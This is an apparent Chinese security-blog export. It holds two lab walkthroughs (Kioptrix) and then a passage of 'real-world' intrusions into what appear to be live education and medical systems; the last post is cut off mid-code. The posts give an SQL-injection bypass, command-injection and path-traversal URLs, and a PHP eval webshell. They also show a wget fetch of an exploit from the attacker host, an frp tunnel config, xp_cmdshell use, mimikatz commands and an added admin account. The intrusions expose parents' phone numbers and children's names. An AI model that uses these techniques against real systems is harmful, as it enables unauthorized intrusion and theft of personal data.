<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101150334027.png" alt="image-20221101150334027"></p>
<p>对其进行详细扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.151</span><br></pre></td></tr></table></figure>

<p>扫完之后发现开启了，22,80,111,443,631,3306端口</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101150554922.png" alt="image-20221101150554922"></p>
<h2 id="漏洞利用-80端口"><a href="#漏洞利用-80端口" class="headerlink" title="漏洞利用-80端口"></a>漏洞利用-80端口</h2><p>扫完之后，访问这个网站，是一个登录页面</p>
<p>直接万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<p>就直接进去了</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151226173.png" alt="image-20221101151226173"></p>
<p>这个看样子是个ping的功能，我估摸着就以前ctf那种绕过呗。</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151328801.png" alt="image-20221101151328801"></p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151334154.png" alt="image-20221101151334154"></p>
<p>这直接就是一个rce</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151355200.png" alt="image-20221101151355200"></p>
<p>但是是apache的权限，目前需要进行一个提权，说实话，我对提权部分都不是很了解，所以在备考的时候，肯定会补上常见提权这个大坑。</p>
<p>先弹一个nc回来。</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151711771.png" alt="image-20221101151711771"></p>
<p>通过这个东西</p>
<p><code>cat /proc/version</code>(这个找不到，导致后面搜错了)</p>
<p><code>lsb_release -a</code>这个找到的</p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101153429032.png" alt="image-20221101153429032"></p>
<p><code>searchsploit centos 4.5</code></p>
<p>我用kali上的没成功，下载一下这个网址上面的</p>
<p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101154418307.png" alt="image-20221101154418307"></p>
<p>下载下面那个</p>
<p>随后起一个http服务将exp传到那边去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333</span><br><span class="line">python.exe -m SimpleHTTPServer 2333</span><br><span class="line">python -m http.server 2333</span><br><span class="line"></span><br><span class="line">反弹shell中执行</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.100.129:2333/9542.c</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101155212618.png" alt="image-20221101155212618"></p>
<p>传过去之后编译执行即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o okk 764.c -lcrypto</span><br><span class="line">./okk</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101155457890.png" alt="image-20221101155457890"></p>
<p>又是成功拿下这台靶机，感觉比上一个还简单。而且还是几乎脱离攻略做的</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>同样是，找ip，扫端口，看漏洞，利用，提权。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>Kioptrix: 2014 (#5)</title>
    <url>/2022/11/03/%C2%96Kioptrix-2014-5/</url>
    <content><![CDATA[<h1 id="Kioptrix-2014-5"><a href="#Kioptrix-2014-5" class="headerlink" title="Kioptrix: 2014 (#5)"></a>Kioptrix: 2014 (#5)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>需要首先卸载原来的网卡，然后再重新安装一块网卡，记得用nat模式。</p>
<p>这些靶场总有一些奇奇怪怪的问题。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>

<p>首先还是通过nmpa扫描c段拿到靶机地址</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png" alt="image-20221103155525638"></p>
<p><code>192.168.100.171</code></p>
<p>然后扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.171</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png" alt="image-20221103155649936"></p>
<p>22,80,8080</p>
<p>8080端口是403</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png" alt="image-20221103155723269"></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png" alt="image-20221103155737120"></p>
<p>80端口有个这个页面，然后开始扫目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png" alt="image-20221103155853459"></p>
<p>啥也没有</p>
<p>识别一下指纹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb http://192.168.100.171/index.html</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png" alt="image-20221103155948060"></p>
<p>通过识别指纹发现有这么个东西，<code>http://192.168.100.171/pChart2.1.3/index.php</code></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png" alt="image-20221103160044077"></p>
<p>感觉就像是一个页面管理或者说是，大多cms后台那种感觉。</p>
<p>随后百度一下<code>pChart2.1.3</code>这个的历史漏洞</p>
<p>其实直接在kali里面搜索也有</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png" alt="image-20221103160649554"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png" alt="image-20221103160732137"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span><br></pre></td></tr></table></figure>

<p>读取到相关文件</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png" alt="image-20221103160921154"></p>
<p>尝试登录ssh，提示连接拒绝。</p>
<p>这里我确实卡住了，我能想到和8080端口的403有关，所以我去查了下有关403的绕过。没用</p>
<p>还是看了看攻略，这里注意，需要结合文件读取的漏洞去读取Apache的配置文件。</p>
<p><a href="http://wiki.apache.org/httpd/DistrosDefaultLayout">http://wiki.apache.org/httpd/DistrosDefaultLayout</a></p>
<p>用漏洞查看配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png" alt="image-20221103161816864"></p>
<p>找到定义的ua头</p>
<p>用burp修改一下。</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png" alt="image-20221103161930930"></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png" alt="image-20221103162113090"></p>
<p>随后去访问一下那个phptax</p>
<p>直接搜一下</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png" alt="image-20221103162520526"></p>
<p>发现有rce，最后一个，那就去看看。</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png" alt="image-20221103162806119"></p>
<p>记得中间的命令需要url编码</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png" alt="image-20221103180605385"></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png" alt="image-20221103180611718"></p>
<p>这里我尝试使用网上报出来的exp进行攻击，但是试了大概有十多分钟一直没有成功，于是我决定写入一个一句话木马来进行控制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&#x27; &gt; test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png" alt="image-20221103183515829"></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png" alt="image-20221103183532663"></p>
<p>然后改成POST一句话木马，用蚁剑进行连接。（我真是天才啊</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png" alt="image-20221103183855920"></p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg" alt="img"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>不过还是无法弹一个nc回来，就用蚁剑的虚拟终端进行提权吧。</p>
<p>首先通过<code>uname -a</code>得知版本信息</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png" alt="image-20221103185130159"></p>
<p>FreeBSD ，下载exp，</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png" alt="image-20221103190319520"></p>
<p>通过蚁剑上传，然后编译，编译的时候报错说是最后一行没有回车，然后加了个回车之后成功编译，但是</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png" alt="image-20221103190359774"></p>
<p>没有用，我估计是，这个蚁剑是通过webshell来执行命令的，和反弹shell并不一样，你web的权限是变不了的。</p>
<p>后面了解到通过perl可以反弹shell回来</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png" alt="image-20221103190447939"></p>
<p>那我们就谈一个shell回来</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png" alt="image-20221103190504541"></p>
<p>直接使用编译好的okk</p>
<p>成功拿下!</p>
<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png" alt="image-20221103190526901"></p>
<p>所以正确的方法就是通过prel直接弹shell回来，没必要写一个webshell浪费时间捏。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反弹shell的时候多试几种，然后就是各种细节都得做好才行。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>【实战】UEditor.net rce的一次渗透</title>
    <url>/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="【实战】UEditor-net-rce的一次渗透"><a href="#【实战】UEditor-net-rce的一次渗透" class="headerlink" title="【实战】UEditor.net rce的一次渗透"></a>【实战】UEditor.net rce的一次渗透</h1><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>一次睡梦中梦到的站点</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173157156.png" alt="image-20230420173157156"></p>
<p>拿到一个站点之后，随便点了点，测了一下sql注入，没反应。</p>
<p>随后看到bp上的被动扫描发现UEditor.net rce</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173350089.png" alt="image-20230420173350089"></p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173411060.png" alt="image-20230420173411060"></p>
<p>随后开始构造poc</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxx.com/scripts/ueditor/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后制作aspx马上传到服务器，开一个web服务，供目标机器访问。</p>
<p>随后访问poc，输入aspx马的地址，</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173638555.png" alt="image-20230420173638555"></p>
<p>上传成功但是，拼接路径之后发现文件已经被删除了。</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174241352.png" alt="image-20230420174241352"></p>
<p>怀疑被杀毒软件删除了。故使用tide的aspx免杀马重新上传，上传成功</p>
<p>这里需要注意的是aspx马的地址,需要使用如下方式绕过，使其上传解析为aspx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174707602.png" alt="image-20230420174707602"></p>
<p>上传成功，随机使用冰蝎链接</p>
<p>成功链接</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174913465.png" alt="image-20230420174913465"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿下shell之后信息收集一波</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180654341.png" alt="image-20230420180654341"></p>
<p>iis权限</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180710809.png" alt="image-20230420180710809"></p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180734154.png" alt="image-20230420180734154"></p>
<p>win的系统</p>
<p>tasklist发现存在阿里云的云盾</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180830085.png" alt="image-20230420180830085"></p>
<p>尝试iis6提权脚本，未果，疑似被云盾查杀，土豆也尝试过，无果。</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>随后一直困在提权里面，闲着无聊，翻了翻网站的配置文件</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194623841.png" alt="image-20230420194623841"></p>
<p>一般这种asp的站，web.config里面的 <code>&lt;connectionStrings&gt;</code>节点里面会有数据库的账号密码，我们就去数据库里面看看。这个站用的是sqlserver，也就是mssql。之前看进程的时候看到的。</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194736099.png" alt="image-20230420194736099"></p>
<p>确实发现了数据库账号密码，可惜不是sa权限的。</p>
<p>用冰蝎自带的数据库管理工具链接上去</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194854895.png" alt="image-20230420194854895"></p>
<p>链接成功</p>
<p>连接确实是链接到了，但是看不到表里面的数据啊。按理说，既然是配置文件中的账号，那么不会出现账号权限不足的情况。但是确实表里面什么东西都看不到，不得不怀疑是冰蝎本身的问题，所以我决定上代理，然后用正常的数据库管理工具尝试一下。</p>
<p>然后老办法，frp传上去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p>攻击机开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200359745.png" alt="image-20230420200359745"></p>
<p>成功建立连接，现在准备连接他的数据库。</p>
<p>链接成功</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200638004.png" alt="image-20230420200638004"></p>
<p>确实是有数据的，只是冰蝎的工具有问题。</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201008346.png" alt="image-20230420201008346"></p>
<p>发现大量的数据，各个家长的手机号码和孩子的名字。</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201620094.png" alt="image-20230420201620094"></p>
<p>还有很多订单信息</p>
<p>虽然我知道没有sa的权限，但是还是抱着试一试的态度,想试试MSSQL xp_cmdshell提权漏洞</p>
<p><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;</code></p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201317706.png" alt="image-20230420201317706"></p>
<p>开启了xp_cmdshell</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201359026.png" alt="image-20230420201359026"></p>
<p>执行却失败了。唉。</p>
<p>我超，但是我尝试使用这个用户的密码登录sa账户，居然成功了！</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202053653.png" alt="image-20230420202053653"></p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202124643.png" alt="image-20230420202124643"></p>
<p>打开xp_cmdshell</p>
<p><code>exec master..xp_cmdshell &#39;whoami&#39;</code></p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202329456.png" alt="image-20230420202329456"></p>
<p>成功来到sqlserver权限</p>
<h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202646252.png" alt="image-20230420202646252"></p>
<p>添加用户</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202708880.png" alt="image-20230420202708880"></p>
<p>加到管理组去</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203129525.png" alt="image-20230420203129525"></p>
<p>成功添加到管理组了！！</p>
<p>远程桌面链接成功！</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203150864.png" alt="image-20230420203150864"></p>
<p>然后手动关掉防火墙</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204036644.png" alt="image-20230420204036644"></p>
<p>传猕猴桃上去抓一下密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204610088.png" alt="image-20230420204610088"></p>
<p>准备hash传递登录administrator账户</p>
<p>传递没成功，不过无所谓了。反正我们创建的账户已经有管理员权限了。</p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用netspy看看存活网断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netspy.exe -x is //极速模式</span><br></pre></td></tr></table></figure>

<p>发现竟然没有扫描到存活网段，也是，毕竟是云上的服务器。那就arp -a.</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210326953.png" alt="image-20230420210326953"></p>
<p>判断出存在b段172.29，上fscan一把嗦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan64.exe -h 172.29.x.x -h 172.29.1.1/16</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210648416.png" alt="image-20230420210648416"></p>
<p>结果也只扫到了自己捏。估计是真的没什么东西吧</p>
<p>后面又重新hash传递了一下，换了个方法传递成功之后，准备上管理员的机器看看有没有什么运维本什么的。</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213038176.png" alt="image-20230420213038176"></p>
<p>随后登录我们刚刚创建的管理员账号上去，关掉这个策略限制</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213258547.png" alt="image-20230420213258547"></p>
<p>给他改成禁用。</p>
<p>但是需要administrator注销重新登录才可以，我又不能直接重启，我怕把他web服务给整掉了</p>
<p>确实也只有一台服务器</p>
<p><img src="/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420215042417.png" alt="image-20230420215042417"></p>
<p>暂时点到为止吧</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>【实战】从rce到上马到脏牛提权到内网</title>
    <url>/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<h1 id="【实战】从rce到上马到脏牛提权到内网"><a href="#【实战】从rce到上马到脏牛提权到内网" class="headerlink" title="【实战】从rce到上马到脏牛提权到内网"></a>【实战】从rce到上马到脏牛提权到内网</h1><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到一个战，得知是ECSimaging</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212721477.png" alt="image-20230212212721477"></p>
<p>这是一个国外的医疗管理系统，长这样</p>
<p>后续我们在github上面找到这套系统的rce漏洞</p>
<p><code>/new_movie.php?studyUID=1&amp;start=2&amp;end=2&amp;file=1;pwd</code></p>
<p>上面是poc</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212853107.png" alt="image-20230212212853107"></p>
<p>看到成功执行命令。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接用exp打的没意思</p>
<p>但是ls之后我发现存在一个<a href="http://www.tar网站备份的文件.于是我决定下载下来对这个漏洞进行研究/">www.tar网站备份的文件。于是我决定下载下来对这个漏洞进行研究</a></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213180055117.png" alt="image-20230213180055117"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213142620037.png" alt="image-20230213142620037"></p>
<p>直接找到漏洞触发的点，new_movie.php。</p>
<p>打开文件进行审计,关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$studyUID</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$start</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$end</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$file</span>) )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;studyUID: &#x27;</span>.<span class="variable">$studyUID</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;start: &#x27;</span>.<span class="variable">$start</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;end: &#x27;</span>.<span 